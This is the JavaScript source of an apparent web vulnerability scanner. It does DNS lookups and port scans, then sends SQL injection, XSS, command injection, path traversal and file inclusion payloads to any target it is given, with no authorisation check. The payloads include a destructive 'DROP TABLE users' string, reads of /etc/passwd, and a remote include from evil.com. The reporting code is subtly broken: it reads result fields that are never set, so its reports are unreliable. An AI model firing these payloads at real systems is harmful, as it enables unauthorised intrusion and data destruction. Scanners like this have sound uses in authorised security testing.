#!/usr/bin/env node

const https = require('https');
const http = require('http');
const crypto = require('crypto');
const { GroundTruthEvaluation, GroundTruthEnvironment } = require('./ground-truth-evaluation');

class RealAuditEngine {
    constructor(target, options = {}) {
        this.target = target;
        this.options = {
            timeout: options.timeout || 30000,
            maxRetries: options.maxRetries || 3,
            userAgent: options.userAgent || 'RealAuditEngine/1.0',
            ...options
        };
        
        this.evaluation = new GroundTruthEvaluation();
        this.traces = [];
        this.sessionId = this.generateSessionId();
        this.startTime = Date.now();
    }

    generateSessionId() {
        return crypto.randomBytes(16).toString('hex');
    }

    async performRealAudit() {
        console.log(`🔥 REAL AUDIT ENGINE: ${this.target}`);
        console.log(`📋 Session ID: ${this.sessionId}`);
        console.log('=' .repeat(80));

        try {
            // Phase 1: Target reconnaissance
            await this.performReconnaissance();
            
            // Phase 2: Vulnerability testing with evidence collection
            await this.performVulnerabilityTesting();
            
            // Phase 3: Generate reproducible report
            const report = this.generateReproducibleReport();
            
            console.log('\n' + '='.repeat(80));
            console.log('✅ REAL AUDIT COMPLETED');
            console.log('='.repeat(80));
            
            return report;
            
        } catch (error) {
            console.error('❌ Real audit failed:', error.message);
            throw error;
        }
    }

    async performReconnaissance() {
        console.log('\n🔍 PHASE 1: TARGET RECONNAISSANCE');
        
        const recon = {
            dns: await this.performDNSLookup(),
            ports: await this.performPortScan(),
            headers: await this.analyzeHeaders(),
            technologies: await this.detectTechnologies()
        };

        console.log(`   ✅ DNS records: ${Object.keys(recon.dns).length}`);
        console.log(`   ✅ Open ports: ${recon.ports.length}`);
        console.log(`   ✅ Headers analyzed: ${Object.keys(recon.headers).length}`);
        console.log(`   ✅ Technologies detected: ${recon.technologies.length}`);
        
        return recon;
    }

    async performDNSLookup() {
        const { promisify } = require('util');
        const dns = require('dns').promises;
        
        try {
            const records = {};
            
            // A records
            try {
                records.A = await dns.resolve4(this.target);
            } catch (e) { records.A = []; }
            
            // MX records
            try {
                records.MX = await dns.resolveMx(this.target);
            } catch (e) { records.MX = []; }
            
            // NS records
            try {
                records.NS = await dns.resolveNs(this.target);
            } catch (e) { records.NS = []; }
            
            // TXT records
            try {
                records.TXT = await dns.resolveTxt(this.target);
            } catch (e) { records.TXT = []; }
            
            return records;
        } catch (error) {
            console.log(`   ❌ DNS lookup failed: ${error.message}`);
            return {};
        }
    }

    async performPortScan() {
        const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 5432, 8080, 8443];
        const openPorts = [];
        
        for (const port of commonPorts) {
            try {
                const isOpen = await this.checkPort(port);
                if (isOpen) {
                    openPorts.push(port);
                    console.log(`     ✅ Port ${port} open`);
                }
            } catch (error) {
                // Port closed or filtered
            }
        }
        
        return openPorts;
    }

    async checkPort(port) {
        return new Promise((resolve) => {
            const net = require('net');
            const socket = new net.Socket();
            
            socket.setTimeout(1000);
            
            socket.on('connect', () => {
                socket.destroy();
                resolve(true);
            });
            
            socket.on('timeout', () => {
                socket.destroy();
                resolve(false);
            });
            
            socket.on('error', () => {
                resolve(false);
            });
            
            socket.connect(port, this.target);
        });
    }

    async analyzeHeaders() {
        try {
            const response = await this.makeRequest('/');
            return response.headers;
        } catch (error) {
            console.log(`   ❌ Header analysis failed: ${error.message}`);
            return {};
        }
    }

    async detectTechnologies() {
        const technologies = [];
        
        try {
            const response = await this.makeRequest('/');
            const headers = response.headers;
            const body = response.data;
            
            // Server header analysis
            if (headers.server) {
                technologies.push({
                    type: 'web_server',
                    name: headers.server,
                    confidence: 0.9,
                    source: 'headers'
                });
            }
            
            // X-Powered-By header
            if (headers['x-powered-by']) {
                technologies.push({
                    type: 'framework',
                    name: headers['x-powered-by'],
                    confidence: 0.8,
                    source: 'headers'
                });
            }
            
            // Content analysis
            if (body.includes('wp-content')) {
                technologies.push({
                    type: 'cms',
                    name: 'WordPress',
                    confidence: 0.7,
                    source: 'content'
                });
            }
            
            if (body.includes('react') || body.includes('React')) {
                technologies.push({
                    type: 'framework',
                    name: 'React',
                    confidence: 0.6,
                    source: 'content'
                });
            }
            
        } catch (error) {
            console.log(`   ❌ Technology detection failed: ${error.message}`);
        }
        
        return technologies;
    }

    async performVulnerabilityTesting() {
        console.log('\n🚨 PHASE 2: VULNERABILITY TESTING WITH EVIDENCE COLLECTION');
        
        const testResults = {
            sqlInjection: await this.testSQLInjection(),
            xss: await this.testXSS(),
            commandInjection: await this.testCommandInjection(),
            directoryTraversal: await this.testDirectoryTraversal(),
            fileInclusion: await this.testFileInclusion()
        };
        
        return testResults;
    }

    async testSQLInjection() {
        console.log('   🔍 Testing SQL Injection...');
        
        const payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND 1=CONVERT(int, (SELECT @@version))--"
        ];
        
        const results = [];
        
        for (const payload of payloads) {
            const traceId = this.generateTraceId();
            
            try {
                const startTime = Date.now();
                const response = await this.makeRequest(`/?id=${encodeURIComponent(payload)}`);
                const endTime = Date.now();
                
                const trace = this.evaluation.createTrace(traceId, this.target, payload, {
                    method: 'GET',
                    url: `${this.target}/?id=${encodeURIComponent(payload)}`,
                    headers: {
                        'User-Agent': this.options.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    },
                    body: '',
                    timestamp: new Date(startTime).toISOString()
                }, {
                    status: response.statusCode,
                    headers: response.headers,
                    body: response.data,
                    timestamp: new Date(endTime).toISOString(),
                    duration: endTime - startTime
                });
                
                if (trace.evidence.length > 0) {
                    console.log(`     🚨 SQL Injection evidence found (confidence: ${Math.max(...trace.evidence.map(e => e.confidence))})`);
                    results.push(trace);
                }
                
                this.traces.push(trace);
                
            } catch (error) {
                console.log(`     ❌ SQL Injection test failed: ${error.message}`);
            }
        }
        
        return results;
    }

    async testXSS() {
        console.log('   🔍 Testing XSS...');
        
        const payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>',
            "';alert(1);//"
        ];
        
        const results = [];
        
        for (const payload of payloads) {
            const traceId = this.generateTraceId();
            
            try {
                const startTime = Date.now();
                const response = await this.makeRequest(`/?search=${encodeURIComponent(payload)}`);
                const endTime = Date.now();
                
                const trace = this.evaluation.createTrace(traceId, this.target, payload, {
                    method: 'GET',
                    url: `${this.target}/?search=${encodeURIComponent(payload)}`,
                    headers: {
                        'User-Agent': this.options.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    },
                    body: '',
                    timestamp: new Date(startTime).toISOString()
                }, {
                    status: response.statusCode,
                    headers: response.headers,
                    body: response.data,
                    timestamp: new Date(endTime).toISOString(),
                    duration: endTime - startTime
                });
                
                if (trace.evidence.length > 0) {
                    console.log(`     🚨 XSS evidence found (confidence: ${Math.max(...trace.evidence.map(e => e.confidence))})`);
                    results.push(trace);
                }
                
                this.traces.push(trace);
                
            } catch (error) {
                console.log(`     ❌ XSS test failed: ${error.message}`);
            }
        }
        
        return results;
    }

    async testCommandInjection() {
        console.log('   🔍 Testing Command Injection...');
        
        const payloads = [
            '; ls -la',
            '&& cat /etc/passwd',
            '| whoami',
            '`id`',
            '$(id)'
        ];
        
        const results = [];
        
        for (const payload of payloads) {
            const traceId = this.generateTraceId();
            
            try {
                const startTime = Date.now();
                const response = await this.makeRequest(`/?cmd=${encodeURIComponent(payload)}`);
                const endTime = Date.now();
                
                const trace = this.evaluation.createTrace(traceId, this.target, payload, {
                    method: 'GET',
                    url: `${this.target}/?cmd=${encodeURIComponent(payload)}`,
                    headers: {
                        'User-Agent': this.options.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    },
                    body: '',
                    timestamp: new Date(startTime).toISOString()
                }, {
                    status: response.statusCode,
                    headers: response.headers,
                    body: response.data,
                    timestamp: new Date(endTime).toISOString(),
                    duration: endTime - startTime
                });
                
                if (trace.evidence.length > 0) {
                    console.log(`     🚨 Command Injection evidence found (confidence: ${Math.max(...trace.evidence.map(e => e.confidence))})`);
                    results.push(trace);
                }
                
                this.traces.push(trace);
                
            } catch (error) {
                console.log(`     ❌ Command Injection test failed: ${error.message}`);
            }
        }
        
        return results;
    }

    async testDirectoryTraversal() {
        console.log('   🔍 Testing Directory Traversal...');
        
        const payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ];
        
        const results = [];
        
        for (const payload of payloads) {
            const traceId = this.generateTraceId();
            
            try {
                const startTime = Date.now();
                const response = await this.makeRequest(`/?file=${encodeURIComponent(payload)}`);
                const endTime = Date.now();
                
                const trace = this.evaluation.createTrace(traceId, this.target, payload, {
                    method: 'GET',
                    url: `${this.target}/?file=${encodeURIComponent(payload)}`,
                    headers: {
                        'User-Agent': this.options.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    },
                    body: '',
                    timestamp: new Date(startTime).toISOString()
                }, {
                    status: response.statusCode,
                    headers: response.headers,
                    body: response.data,
                    timestamp: new Date(endTime).toISOString(),
                    duration: endTime - startTime
                });
                
                if (response.data.includes('root:') || response.data.includes('bin/bash')) {
                    console.log(`     🚨 Directory Traversal evidence found`);
                    results.push(trace);
                }
                
                this.traces.push(trace);
                
            } catch (error) {
                console.log(`     ❌ Directory Traversal test failed: ${error.message}`);
            }
        }
        
        return results;
    }

    async testFileInclusion() {
        console.log('   🔍 Testing File Inclusion...');
        
        const payloads = [
            'http://evil.com/evil.txt',
            '/etc/passwd',
            'php://filter/resource',
            'data://text/plain;base64,PD9waHAgcGhvc3RlcmUgaW4='
        ];
        
        const results = [];
        
        for (const payload of payloads) {
            const traceId = this.generateTraceId();
            
            try {
                const startTime = Date.now();
                const response = await this.makeRequest(`/?page=${encodeURIComponent(payload)}`);
                const endTime = Date.now();
                
                const trace = this.evaluation.createTrace(traceId, this.target, payload, {
                    method: 'GET',
                    url: `${this.target}/?page=${encodeURIComponent(payload)}`,
                    headers: {
                        'User-Agent': this.options.userAgent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    },
                    body: '',
                    timestamp: new Date(startTime).toISOString()
                }, {
                    status: response.statusCode,
                    headers: response.headers,
                    body: response.data,
                    timestamp: new Date(endTime).toISOString(),
                    duration: endTime - startTime
                });
                
                if (response.data.includes('evil content') || response.data.includes('root:')) {
                    console.log(`     🚨 File Inclusion evidence found`);
                    results.push(trace);
                }
                
                this.traces.push(trace);
                
            } catch (error) {
                console.log(`     ❌ File Inclusion test failed: ${error.message}`);
            }
        }
        
        return results;
    }

    generateTraceId() {
        return crypto.randomBytes(8).toString('hex');
    }

    async makeRequest(path, method = 'GET', body = '') {
        return new Promise((resolve, reject) => {
            const url = new URL(path.startsWith('http') ? path : `https://${this.target}${path}`);
            const isHttps = url.protocol === 'https:';
            const httpModule = isHttps ? https : http;
            
            const options = {
                hostname: url.hostname,
                port: url.port || (isHttps ? 443 : 80),
                path: url.pathname + url.search,
                method: method,
                headers: {
                    'User-Agent': this.options.userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive'
                },
                timeout: this.options.timeout
            };
            
            const req = httpModule.request(options, (res) => {
                let data = '';
                
                res.on('data', (chunk) => {
                    data += chunk;
                });
                
                res.on('end', () => {
                    resolve({
                        statusCode: res.statusCode,
                        headers: res.headers,
                        data: data
                    });
                });
            });
            
            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Request timeout'));
            });
            
            if (body) {
                req.write(body);
            }
            
            req.end();
        });
    }

    generateReproducibleReport() {
        const endTime = Date.now();
        const duration = endTime - this.startTime;
        
        const report = {
            metadata: {
                sessionId: this.sessionId,
                target: this.target,
                startTime: new Date(this.startTime).toISOString(),
                endTime: new Date(endTime).toISOString(),
                duration: duration,
                engine: 'RealAuditEngine v1.0',
                totalTraces: this.traces.length,
                reproducible: true
            },
            reconnaissance: {
                dns: this.dnsResults,
                ports: this.portResults,
                headers: this.headerResults,
                technologies: this.technologyResults
            },
            vulnerabilityTests: {
                sqlInjection: this.sqlInjectionResults,
                xss: this.xssResults,
                commandInjection: this.commandInjectionResults,
                directoryTraversal: this.directoryTraversalResults,
                fileInclusion: this.fileInclusionResults
            },
            evidence: {
                totalTraces: this.traces.length,
                tracesWithEvidence: this.traces.filter(t => t.evidence.length > 0).length,
                evidenceTypes: this.getEvidenceDistribution(),
                reproducibleTraces: this.traces.filter(t => t.evidence.length > 0).length
            },
            rawTraces: this.traces
        };
        
        // Save report
        this.saveReport(report);
        
        return report;
    }

    getEvidenceDistribution() {
        const distribution = {};
        
        for (const trace of this.traces) {
            for (const evidence of trace.evidence) {
                if (!distribution[evidence.type]) {
                    distribution[evidence.type] = 0;
                }
                distribution[evidence.type]++;
            }
        }
        
        return distribution;
    }

    saveReport(report) {
        const filename = `real_audit_${this.target}_${report.metadata.sessionId}.json`;
        const filepath = require('path').join(process.cwd(), 'reports', filename);
        
        // Ensure reports directory exists
        const reportsDir = require('path').dirname(filepath);
        const fs = require('fs');
        if (!fs.existsSync(reportsDir)) {
            fs.mkdirSync(reportsDir, { recursive: true });
        }
        
        fs.writeFileSync(filepath, JSON.stringify(report, null, 2));
        console.log(`\n📄 Real audit report saved: ${filepath}`);
        
        // Save traces separately for replay
        this.evaluation.saveTraces(`traces_${report.metadata.sessionId}.json`);
    }
}

module.exports = RealAuditEngine;
